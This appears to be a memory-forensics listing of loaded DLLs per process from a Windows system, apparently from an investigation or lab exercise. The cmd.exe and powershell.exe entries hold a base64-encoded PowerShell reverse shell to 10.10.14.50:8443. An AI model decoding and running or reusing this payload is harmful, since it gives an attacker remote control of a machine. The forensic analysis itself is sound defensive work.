Error opening System(4):
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x00000000143c0000  0x58000   c:\windows\system32\ualsvc.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x0000000028a90000  0x156000  C:\Windows\System32\ole32.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000028bf0000  0x14f8000  C:\Windows\System32\SHELL32.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x0000000025230000  0x31000   C:\Windows\SYSTEM32\ntmarta.dll
0x0000000024fb0000  0xc4000   c:\windows\system32\tdh.dll
0x000000001c8b0000  0x22000   c:\windows\system32\mi.dll
0x000000001c850000  0x60000   c:\windows\system32\miutils.dll
0x0000000024e90000  0x4f000   c:\windows\system32\mintdh.dll
0x00000000153d0000  0x32b000  c:\windows\system32\ESENT.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000025bd0000  0xc000    C:\Windows\system32\CRYPTBASE.DLL
0x00000000143b0000  0xd000    C:\Windows\SYSTEM32\atlthunk.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x000000001aa50000  0x11000   C:\Windows\system32\wbem\wbemprox.dll
0x00000000282b0000  0x6d000   C:\Windows\System32\WS2_32.dll
0x000000001dcf0000  0x8d000   C:\Windows\SYSTEM32\wbemcomn.dll
0x000000001aa70000  0x14000   C:\Windows\system32\wbem\wbemsvc.dll
0x000000001a6f0000  0xf1000   C:\Windows\system32\wbem\fastprox.dll
------------------------------------------------------------------------------
svchost.exe pid: 3756
Command line: C:\Windows\System32\svchost.exe -k LocalService -p -s LicenseManager

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\System32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000013cd0000  0x11000   c:\windows\system32\licensemanagersvc.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x0000000013bb0000  0x11f000  c:\windows\system32\LicenseManager.dll
0x0000000018ac0000  0x28000   c:\windows\system32\CLIPC.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x0000000020750000  0x73f000  C:\Windows\System32\OneCoreUAPCommonProxyStub.dll
0x0000000013af0000  0xba000   C:\Windows\System32\Windows.Networking.Connectivity.dll
0x000000001fe00000  0xf000    C:\Windows\System32\npmproxy.dll
0x0000000025710000  0x3d000   C:\Windows\System32\IPHLPAPI.DLL
0x00000000274e0000  0x8000    C:\Windows\System32\NSI.dll
0x0000000022420000  0x151000  C:\Windows\System32\WinTypes.dll
0x00000000139f0000  0xf9000   C:\Windows\System32\wuapi.dll
0x00000000139d0000  0x16000   C:\Windows\System32\wups.dll
0x0000000020eb0000  0xfd000   c:\windows\system32\WINHTTP.dll
0x0000000020580000  0x16000   C:\Windows\SYSTEM32\dhcpcsvc6.DLL
0x0000000020550000  0x1c000   C:\Windows\SYSTEM32\dhcpcsvc.DLL
0x00000000282b0000  0x6d000   C:\Windows\System32\WS2_32.dll
0x0000000018d30000  0xe1000   C:\Windows\System32\Windows.Security.Authentication.OnlineId.dll
0x0000000026000000  0xa000    C:\Windows\SYSTEM32\DPAPI.DLL
0x0000000025bd0000  0xc000    C:\Windows\SYSTEM32\CRYPTBASE.dll
------------------------------------------------------------------------------
svchost.exe pid: 4904
Command line: C:\Windows\system32\svchost.exe -k netsvcs -p -s UsoSvc

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\system32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x00000000138e0000  0xe3000   c:\windows\system32\usocore.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000019a90000  0x29000   c:\windows\system32\DMCmnUtils.dll
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000021160000  0x8a000   c:\windows\system32\msvcp110_win.dll
0x0000000022db0000  0x3a000   c:\windows\system32\XmlLite.dll
0x0000000018ed0000  0x37000   c:\windows\system32\UpdatePolicy.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000020400000  0x28000   c:\windows\system32\Cabinet.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x0000000013810000  0xc4000   C:\Windows\System32\updatehandlers.dll
0x0000000021cb0000  0xbe000   C:\Windows\System32\taskschd.dll
0x0000000026140000  0x2f000   C:\Windows\System32\SspiCli.dll
0x00000000139f0000  0xf9000   C:\Windows\System32\wuapi.dll
0x0000000013740000  0xc5000   c:\windows\system32\UPShared.dll
0x0000000020eb0000  0xfd000   c:\windows\system32\WINHTTP.dll
0x0000000026000000  0xa000    c:\windows\system32\DPAPI.DLL
0x0000000014e60000  0x1e000   C:\Windows\System32\usoapi.dll
0x000000001a140000  0xde000   C:\Windows\System32\FlightSettings.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x000000001a310000  0x20000   C:\Windows\System32\bcd.dll
0x0000000013af0000  0xba000   C:\Windows\System32\Windows.Networking.Connectivity.dll
0x000000001fe00000  0xf000    C:\Windows\System32\npmproxy.dll
0x0000000025710000  0x3d000   C:\Windows\System32\IPHLPAPI.DLL
0x00000000274e0000  0x8000    C:\Windows\System32\NSI.dll
0x0000000022420000  0x151000  C:\Windows\System32\WinTypes.dll
0x0000000021240000  0x88000   C:\Windows\SYSTEM32\policymanager.dll
0x0000000014d30000  0xc000    C:\Windows\system32\WaaSMedicPS.dll
0x00000000202e0000  0x13000   C:\Windows\SYSTEM32\wtsapi32.dll
0x00000000260b0000  0x58000   C:\Windows\SYSTEM32\WINSTA.dll
0x0000000025230000  0x31000   C:\Windows\SYSTEM32\ntmarta.dll
0x0000000014d00000  0x21000   C:\Windows\System32\WaaSAssessment.dll
0x000000000c000000  0xb9000   C:\Windows\System32\Windows.Web.dll
0x000000001bcf0000  0x2ab000  C:\Windows\System32\iertutil.dll
0x0000000014cc0000  0x3c000   C:\Windows\System32\wosc.dll
0x0000000014c80000  0x16000   C:\Windows\System32\Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
0x0000000025580000  0x33000   C:\Windows\system32\rsaenh.dll
0x0000000025bd0000  0xc000    C:\Windows\system32\CRYPTBASE.dll
0x00000000282b0000  0x6d000   C:\Windows\System32\WS2_32.dll
0x0000000025a00000  0x67000   C:\Windows\system32\mswsock.dll
0x0000000020ea0000  0xb000    C:\Windows\SYSTEM32\WINNSI.DLL
0x0000000020580000  0x16000   C:\Windows\SYSTEM32\dhcpcsvc6.DLL
0x0000000020550000  0x1c000   C:\Windows\SYSTEM32\dhcpcsvc.DLL
0x0000000018d30000  0xe1000   C:\Windows\System32\Windows.Security.Authentication.OnlineId.dll
0x0000000020750000  0x73f000  C:\Windows\System32\OneCoreUAPCommonProxyStub.dll
0x000000001f810000  0x99000   c:\windows\system32\webio.dll
0x0000000025750000  0xc6000   C:\Windows\SYSTEM32\DNSAPI.dll
0x000000001fff0000  0xa000    C:\Windows\System32\rasadhlp.dll
0x0000000028a90000  0x156000  C:\Windows\System32\ole32.dll
------------------------------------------------------------------------------
svchost.exe pid: 4852
Command line: C:\Windows\system32\svchost.exe -k LocalService -p -s CDPSvc

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\system32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000013690000  0xa4000   c:\windows\system32\cdpsvc.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x000000001b060000  0x513000  c:\windows\system32\cdp.dll
0x0000000027550000  0xa7000   C:\Windows\System32\SHCORE.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x00000000228b0000  0x1a9000  c:\windows\system32\PROPSYS.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x000000001fe10000  0xc0000   c:\windows\system32\dsreg.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x0000000021160000  0x8a000   c:\windows\system32\msvcp110_win.dll
0x0000000022420000  0x151000  C:\Windows\SYSTEM32\wintypes.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000021240000  0x88000   C:\Windows\SYSTEM32\policymanager.dll
0x0000000025cd0000  0x2c000   c:\windows\system32\ncrypt.dll
0x0000000025c90000  0x3c000   c:\windows\system32\NTASN1.dll
0x000000001c210000  0x5a000   C:\Windows\system32\ncryptprov.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000025bd0000  0xc000    C:\Windows\system32\CRYPTBASE.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x0000000013580000  0x104000  C:\Windows\system32\ShareHost.dll
0x00000000262e0000  0x747000  C:\Windows\System32\Windows.Storage.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x00000000241c0000  0xe2000   C:\Windows\system32\CoreMessaging.dll
0x0000000022580000  0x322000  C:\Windows\system32\CoreUIComponents.dll
0x0000000025230000  0x31000   C:\Windows\SYSTEM32\ntmarta.dll
0x0000000013af0000  0xba000   C:\Windows\System32\Windows.Networking.Connectivity.dll
0x000000001fe00000  0xf000    C:\Windows\System32\npmproxy.dll
0x0000000025710000  0x3d000   C:\Windows\System32\IPHLPAPI.DLL
0x00000000274e0000  0x8000    C:\Windows\System32\NSI.dll
0x0000000022e90000  0x3a000   C:\Windows\System32\Windows.Devices.Radios.dll
------------------------------------------------------------------------------
svchost.exe pid: 784
Command line: C:\Windows\system32\svchost.exe -k appmodel -p -s StateRepository

Base                Size      Path
0x0000000073cb0000  0x10000   C:\Windows\system32\svchost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x00000000ffad0000  0x4c5000  c:\windows\system32\windows.staterepository.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x000000001f760000  0xa6000   c:\windows\system32\StateRepository.Core.dll
0x0000000025c60000  0x26000   C:\Windows\SYSTEM32\WLDP.DLL
0x0000000027010000  0x1fe000  C:\Windows\System32\CRYPT32.dll
0x0000000026270000  0x12000   C:\Windows\System32\MSASN1.dll
0x0000000026a30000  0x5f000   C:\Windows\System32\WINTRUST.dll
0x0000000014e80000  0xf000    C:\Windows\SYSTEM32\windows.staterepositorycore.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x00000000ff9a0000  0x129000  C:\Windows\System32\Windows.StateRepositoryPS.dll
------------------------------------------------------------------------------
cmd.exe pid: 4720
Command line: "C:\Windows\System32\cmd.exe" /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAwACcALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

Base                Size      Path
0x0000000015250000  0x65000   C:\Windows\System32\cmd.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
------------------------------------------------------------------------------
conhost.exe pid: 1816
Command line: \??\C:\Windows\system32\conhost.exe 0x4

Base                Size      Path
0x000000002ba20000  0xd1000   C:\Windows\system32\conhost.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000027550000  0xa7000   C:\Windows\System32\shcore.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000028740000  0xa8000   C:\Windows\System32\advapi32.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x0000000027680000  0x197000  C:\Windows\System32\user32.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000028bf0000  0x14f8000  C:\Windows\System32\shell32.dll
0x0000000026e70000  0x4a000   C:\Windows\System32\cfgmgr32.dll
0x00000000262e0000  0x747000  C:\Windows\System32\windows.storage.dll
0x00000000262b0000  0x23000   C:\Windows\System32\profapi.dll
0x0000000026210000  0x5d000   C:\Windows\System32\powrprof.dll
0x0000000027480000  0x52000   C:\Windows\System32\shlwapi.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x0000000026a90000  0x1b000   C:\Windows\System32\cryptsp.dll
0x00000000289e0000  0xa8000   C:\Windows\System32\clbcatq.dll
0x00000000287f0000  0x16a000  C:\Windows\System32\msctf.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x0000000027d60000  0x2e000   C:\Windows\System32\IMM32.dll
0x0000000028a90000  0x156000  C:\Windows\System32\ole32.dll
------------------------------------------------------------------------------
powershell.exe pid: 2296
Command line: powershell  -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANQAwACcALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA

Base                Size      Path
0x0000000052290000  0x70000   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
0x000000002a260000  0x1ee000  C:\Windows\SYSTEM32\ntdll.dll
0x0000000027820000  0xb3000   C:\Windows\System32\KERNEL32.DLL
0x0000000026ab0000  0x29d000  C:\Windows\System32\KERNELBASE.dll
0x0000000027e70000  0x9e000   C:\Windows\System32\msvcrt.dll
0x0000000028340000  0xc4000   C:\Windows\System32\OLEAUT32.dll
0x0000000026ec0000  0xa0000   C:\Windows\System32\msvcp_win.dll
0x0000000026d70000  0xfa000   C:\Windows\System32\ucrtbase.dll
0x0000000028410000  0x32b000  C:\Windows\System32\combase.dll
0x0000000014960000  0x1c000   C:\Windows\SYSTEM32\ATL.DLL
0x0000000027fe0000  0x11e000  C:\Windows\System32\RPCRT4.dll
0x0000000027680000  0x197000  C:\Windows\System32\USER32.dll
0x0000000027210000  0x82000   C:\Windows\System32\bcryptPrimitives.dll
0x0000000026d50000  0x20000   C:\Windows\System32\win32u.dll
0x0000000028740000  0xa8000   C:\Windows\System32\ADVAPI32.dll
0x0000000027e40000  0x29000   C:\Windows\System32\GDI32.dll
0x0000000027d90000  0xa2000   C:\Windows\System32\sechost.dll
0x00000000272a0000  0x26000   C:\Windows\System32\bcrypt.dll
0x00000000272d0000  0x1aa000  C:\Windows\System32\gdi32full.dll
0x0000000028a90000  0x156000  C:\Windows\System32\OLE32.dll
0x00000000150d0000  0x64000   C:\Windows\SYSTEM32\mscoree.dll
0x0000000015030000  0x9c000   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
0x0000000027480000  0x52000   C:\Windows\System32\SHLWAPI.dll
0x0000000026290000  0x11000   C:\Windows\System32\kernel.appcore.dll
0x000000001d8e0000  0xa000    C:\Windows\SYSTEM32\VERSION.dll
0x0000000012b40000  0xa3b000  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
